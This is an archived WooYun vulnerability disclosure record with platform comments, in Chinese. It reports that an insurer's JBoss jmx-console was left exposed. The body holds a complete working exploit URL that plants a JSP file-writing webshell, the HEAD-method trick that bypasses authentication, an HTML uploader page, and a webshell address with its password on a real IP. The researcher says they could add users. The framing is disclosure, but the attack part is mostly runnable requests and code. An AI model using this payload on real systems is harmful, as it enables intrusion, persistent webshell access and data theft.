{"id": 47609, "wybug_id": "wooyun-2014-085961", "wybug_title": "华泰财产保险有限公司存在任意文件上传（可getshell）", "wybug_corp": "华泰财产保险有限公司", "wybug_author": "Blunber", "wybug_date": "2014-12-05 12:43", "wybug_open_date": "2015-01-19 12:44", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "敏感信息泄露", "敏感接口缺乏认证", "越权操作", "未授权访问", "内部系统对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向公众公开  简要描述： 华泰财产保险有限公司存在任意文件上传，可绕过权限验证，上传war包。 详细说明：  华泰某人力资源网站\n\n网站已经不存在了，但是IP是存活的，而且发现了存在jbosshttp://116.213.76.41:8080/\n\n猜解了几个口令，猜不出来。。。于是尝试用以下方法，可以getshell   漏洞证明：  \nhttp://116.213.76.41:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=upload5warn.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True\n利用抓包看下了\n\n于是换了几个请求，发现 HEAD可以传成功\n\n访问\nhttp://116.213.76.41:8080/upload5warn/shell.jsp\nOK，成功！构建小马\n<html><head><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><title>jsp-test</title></head><style>.main{width:980px;height:600px;margin:0 auto;}.url{width:300px;}.fn{width:60px;}.content{width:80%;height:60%;}</style><script>  function upload(){    var url = document.getElementById('url').value,      content = document.getElementById('content').value,      fileName = document.getElementById('fn').value,      form = document.getElementById('fm');    if(url.length == 0){      alert(\"Url not allowd empty!\");      return ;    }    if(content.length == 0){      alert(\"Content not allowd empty!\");      return ;    }    if(fileName.length == 0){      alert(\"FileName not allowd empty!\");      return ;    }    form.action = url;    form.submit();  }</script><body><div class=\"main\">  <form id=\"fm\" method=\"post\">      URL:<input type=\"text\" value=\"http://url/upload5warn/shell.jsp\" class=\"url\" id=\"url\" />      FileName:<input type=\"text\" name=\"f\" value=\"css.jsp\" class=\"fn\" id=\"fn\" />      <a href=\"javascript:upload();\">Upload</a><br/>    <textarea id=\"content\" class=\"content\" name=\"t\" ></textarea>  </form></div></body></html>\n连接菜刀http://116.213.76.41:8080/upload5warn/cs.jsp 密码admin\n\n可以添加用户\n\n后面的就不试了，反弹也只留给时间吧！用户已删除。   修复方案：  修复还是你们比较专业，不多说了，你们懂！最后啰嗦一句，如果你们不需要这个站，大可把服务关闭！要不然被人攻破内网就不好玩了！只在dmz 滞留了片刻，绝不带走一K流量。   版权声明：转载请注明来源 Blunber@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-08 10:04 厂商回复： 多谢，我们马上删除控制台 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-05 13:07 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  ...估计跟我那个一样，还没修,    \n     2014-12-05 14:58 |    \t\tBlunber \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        )\t\t \n  @_Thorns 估计是，你上次提交多会儿了？    \n     2014-12-05 16:28 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  混脸熟，技术朋友加QQ 5737796    \n     2014-12-05 22:16 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  楼主是大牛逼    \n     2014-12-05 22:21 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @Anonymous 黑产牛...你好。    \n     2014-12-05 22:22 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @Blunber 快一个月了。    \n     2014-12-08 10:04 |    \t\t华泰财产保险有限公司(乌云厂商)\t\t \n  多谢    \n     2014-12-08 10:21 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  20RANK  好高的rank啊     \n     2014-12-08 10:23 |    \t\tBlunber \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        )\t\t \n  @光刃 @华泰财产保险有限公司 只给了rank ,没有WB！why?    \n     2014-12-08 15:50 |    \t\t华泰财产保险有限公司(乌云厂商)\t\t \n  WB是什么？    \n     2014-12-08 16:47 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @Blunber 还没到账呢，别着急~！    \n     2014-12-08 16:47 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  @Blunber 还没到账呢，别着急~！    \n     2014-12-08 17:20 |    \t\tBlunber \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        )\t\t \n  @_Thorns 嘿嘿，心急了。求加好友81869574    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}